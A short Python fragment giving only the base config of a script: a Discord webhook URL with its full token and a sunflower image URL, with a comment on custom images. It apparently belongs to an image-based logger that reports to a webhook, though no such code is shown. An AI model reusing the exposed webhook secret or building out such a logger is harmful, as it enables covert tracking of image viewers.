...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1550790665774825533/SNgqXkNskLurjZ8VvOyAhCILkZI1i5R3SkULtGTwd4hzGbDGdHNegSzYlVsvSwaTjJxR",
    "image": "https://upload.wikimedia.org/wikipedia/commons/4/41/Sunflower_from_Silesia2.jpg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original", # You can also have a custom image by using a URL argument
